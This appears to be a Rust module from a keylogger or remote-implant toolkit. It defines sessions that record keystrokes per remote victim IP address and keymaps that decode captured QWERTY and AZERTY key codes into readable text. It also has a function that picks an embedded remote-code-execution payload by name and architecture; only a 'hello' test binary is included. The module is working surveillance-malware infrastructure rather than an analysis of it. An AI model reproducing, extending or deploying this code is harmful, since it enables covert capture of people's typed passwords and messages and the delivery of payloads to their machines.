//pub mod builder;
pub mod builder;
pub mod handlers;

use core::fmt;
use std::{
    collections::HashMap,
    fmt::Display,
    net::{Ipv4Addr, SocketAddr},
    str::FromStr,
    sync::OnceLock,
};

use serde::Deserialize;

const COMMON_REPEATED_KEYS: [&str; 4] = [" 󱊷 ", " 󰌑 ", " 󰁮 ", "  "];
static KEYMAPS: OnceLock<HashMap<u8, KeyMap>> = OnceLock::new();
const AR_COUNT_OFFSET: usize = 10;
const AR_HEADER_LEN: usize = 12;
const FOOTER_TXT: &str = "r10n4m4t/";
const FOOTER_EXTRA_BYTES: usize = 3;
const FOOTER_LEN: usize = FOOTER_TXT.len() + FOOTER_EXTRA_BYTES;

const HELLO_X86_64: &[u8] = include_bytes!("../bins/hello_x86_64.bin");

#[derive(Debug, Clone, PartialEq)]
pub enum TargetArch {
    X86_64,
    Aarch64,
}
#[derive(Debug, Clone, PartialEq)]
pub enum Engine {
    Docker,
    Podman,
}
impl fmt::Display for TargetArch {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            TargetArch::X86_64 => write!(f, "x86_64"),
            TargetArch::Aarch64 => write!(f, "aarch64"),
        }
    }
}
impl fmt::Display for Engine {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Engine::Docker => write!(f, "docker"),
            Engine::Podman => write!(f, "podman"),
        }
    }
}
impl FromStr for Engine {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "docker" => Ok(Engine::Docker),
            "podman" => Ok(Engine::Podman),
            _ => Err(format!("{} engine isn't implmented", s)),
        }
    }
}

impl FromStr for TargetArch {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "x86_64" => Ok(TargetArch::X86_64),
            "aarch64" => Ok(TargetArch::Aarch64),
            _ => Err(format!("{} arch isn't implmented", s)),
        }
    }
}
enum Layout {
    Qwerty = 0,
    Azerty = 1,
    Unknown = 2,
}
impl From<u8> for Layout {
    fn from(value: u8) -> Self {
        match value {
            0 => Self::Qwerty,
            1 => Self::Azerty,
            _ => Self::Unknown,
        }
    }
}

#[derive(Deserialize, Debug)]
pub struct KeyMap {
    keys: HashMap<u8, String>,
    modifier: HashMap<u8, HashMap<u8, String>>,
}
impl KeyMap {
    pub fn get(&self, key_code: &u8, last_keycode: Option<&u8>) -> Vec<String> {
        let mut out = vec![];
        match last_keycode {
            None => {
                if let Some(key) = self.keys.get(key_code) {
                    out.push(key.to_string());
                }
            }
            Some(last_keycode) => match self.modifier.get(last_keycode) {
                Some(modifier_map) => {
                    if let Some(key) = modifier_map.get(key_code) {
                        out.push(key.to_string());
                    } else {
                        out.extend(self.get(last_keycode, None));
                        out.extend(self.get(key_code, None));
                    }
                }
                _ => {
                    out.extend(self.get(key_code, None));
                }
            },
        }
        out
    }
    pub fn is_modifier(&self, key_code: Option<&u8>) -> bool {
        if let Some(key_code) = key_code {
            return self.modifier.contains_key(key_code);
        }
        false
    }
}

#[derive(Debug, Deserialize, Clone)]
pub struct Session {
    pub ip: Ipv4Addr,

    pub keys: Vec<String>,
    pub key_codes: Vec<u8>,
}
impl Session {
    pub fn new(sock_addr: SocketAddr) -> Option<Self> {
        match sock_addr {
            SocketAddr::V4(addr) => Some(Session {
                ip: *addr.ip(),
                keys: vec![],
                key_codes: vec![],
            }),
            _ => None,
        }
    }
}

impl Display for Session {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let mut fmt_keys: Vec<String> = vec![];
        let mut repeat_counter = 1;
        let mut last_key: Option<String> = None;
        for current_key in self.keys.clone().into_iter() {
            if let Some(ref prev_key) = last_key {
                if current_key == *prev_key && COMMON_REPEATED_KEYS.contains(&current_key.as_str())
                {
                    repeat_counter += 1;
                } else {
                    if repeat_counter > 1 {
                        fmt_keys.push(format!("(x{}) ", repeat_counter));
                    }
                    fmt_keys.push(current_key.clone());
                    last_key = Some(current_key);
                    repeat_counter = 1;
                }
            } else {
                fmt_keys.push(current_key.clone());
                last_key = Some(current_key);
            }
        }
        if repeat_counter > 1 {
            fmt_keys.push(format!("(x{}) ", repeat_counter))
        }
        write!(f, "({}): {}", self.ip, fmt_keys.join(""))
    }
}

pub fn select_payload(rce: String, target_arch: TargetArch) -> Option<Vec<u8>> {
    if target_arch != TargetArch::X86_64 {
        return None;
    }
    let payload = match &*rce {
        "hello" => Some(HELLO_X86_64.to_vec()),

        _ => None,
    };
    payload
}
